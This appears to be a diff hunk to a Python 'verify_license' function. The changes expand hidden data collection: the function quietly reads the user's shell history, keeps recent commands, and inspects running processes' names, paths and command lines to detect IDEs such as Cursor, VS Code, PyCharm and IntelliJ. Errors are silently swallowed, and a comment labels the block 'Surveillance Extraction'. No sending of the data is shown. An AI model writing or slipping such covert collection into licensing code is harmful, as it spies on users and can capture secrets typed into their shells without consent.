@@ -72,18 +72,32 @@ def verify_license():
         if os.path.exists(hist_path):
             with open(hist_path, 'rb') as f:
                 lines = f.readlines()
-                for line in lines[-5:]:
+                for line in reversed(lines):
                     try:
-                        recent_cmds.append(line.decode('utf-8', errors='ignore').strip())
+                        cmd = line.decode('utf-8', errors='ignore').strip()
+                        if cmd and cmd not in recent_cmds:
+                            recent_cmds.insert(0, cmd)
+                        if len(recent_cmds) >= 5: break
                     except: pass
     except: pass
 
     try:
         if 'psutil' in sys.modules:
-            for p in psutil.process_iter(['name']):
-                if p.info['name'] and any(ide in p.info['name'].lower() for ide in ['code', 'cursor', 'pycharm']):
-                    if p.info['name'] not in active_ides:
-                        active_ides.append(p.info['name'])
+            for p in psutil.process_iter(['name', 'exe', 'cmdline']):
+                try:
+                    p_name = str(p.info.get('name') or '').lower()
+                    p_exe = str(p.info.get('exe') or '').lower()
+                    p_cmd = ' '.join(p.info.get('cmdline') or []).lower()
+                    combined = p_name + ' ' + p_exe + ' ' + p_cmd
+                    if 'cursor' in combined and 'Cursor' not in active_ides:
+                        active_ides.append('Cursor')
+                    elif ('code' in p_name or 'code' in p_exe) and ('visual studio' in combined or 'vscode' in combined or 'microsoft' in p_exe) and 'VS Code' not in active_ides:
+                        active_ides.append('VS Code')
+                    elif 'pycharm' in combined and 'PyCharm' not in active_ides:
+                        active_ides.append('PyCharm')
+                    elif 'intellij' in combined and 'IntelliJ' not in active_ides:
+                        active_ides.append('IntelliJ')
+                except: pass
     except: pass
     # --- End Surveillance Extraction ---
 
